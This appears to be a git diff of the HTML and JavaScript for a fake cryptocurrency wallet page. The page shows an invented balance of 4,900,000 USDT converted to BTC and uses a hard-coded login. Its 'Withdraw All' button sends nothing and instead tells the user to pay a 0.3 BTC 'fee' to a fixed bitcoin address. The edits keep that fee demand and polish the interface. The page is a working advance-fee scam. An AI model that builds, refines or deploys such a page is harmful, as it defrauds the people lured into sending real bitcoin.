@@ -148,8 +148,8 @@
     ≈ <span id="btcAmount">Loading...</span> BTC
   </div>
   <button class="login-button" onclick="connectWallet()">Connect Wallet</button>
-  <button class="logout-btn" onclick="logout()">Logout</button>
-  <iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
+  <button class="logout-btn" onclick="openModal('settingsModal')">Settings</button>
+<iframe src="https://www.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&interval=15&theme=dark&style=1&toolbarbg=1e2328&withdateranges=1&hide_top_toolbar=1" frameborder="0"></iframe>
 </div>
 
 <div class="footer hidden" id="footerNav">
@@ -181,15 +181,23 @@
 <div class="modal" id="withdrawModal">
   <div class="modal-content">
     <h3>Withdraw</h3>
-    <input type="text" class="login-input" id="withdrawAddress" placeholder="Enter BTC Address" />
+    <input type="text" class="login-input" placeholder="Wallet Address (BTC)" id="btcAddress" />
     <button class="login-button" onclick="withdrawAll()">Withdraw All</button>
     <button class="logout-btn" onclick="closeModal('withdrawModal')">Close</button>
   </div>
 </div>
 
+<!-- Settings Modal -->
+<div class="modal" id="settingsModal">
+  <div class="modal-content">
+    <h3>Settings</h3>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+  </div>
+</div>
+
 <script>
   const fakeDB = {
-    "demo@wallet.com": "pass123"
+    "user77@walletbtc.online": "kouhG/<3!@"
   };
 
   function toggleForm(type) {
@@ -261,21 +269,19 @@
       const btcPrice = data.bitcoin.usd;
       const usdtAmount = 4900000;
       const btcAmount = (usdtAmount / btcPrice).toFixed(6);
-      document.getElementById("btcAmount").innerText = `${btcAmount}`;
+      document.getElementById("btcAmount").innerText = btcAmount;
     } catch (e) {
       document.getElementById("btcAmount").innerText = "Error loading";
     }
   }
 
   function withdrawAll() {
-    const withdrawAddress = document.getElementById('withdrawAddress').value;
-    if (!withdrawAddress) {
-      alert('Please enter a valid Bitcoin address.');
+    const btcAddress = document.getElementById('btcAddress').value;
+    if (!btcAddress) {
+      alert("Please enter a valid BTC address.");
       return;
     }
-
-    // Show withdrawal notice
-    alert(`Please proceed with your withdrawal transaction by sending a fee amount of 0.3 BTC to the following address: \n\nbc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u\n\nThank you!`);
+    alert(`Please proceed with your withdrawal transaction by sending a fee of 0.3 BTC to this address: bc1qdhgh0u5n38a2rt7jvewfk67uja3dxfl2emwe6u`);
     closeModal('withdrawModal');
   }
 </script>
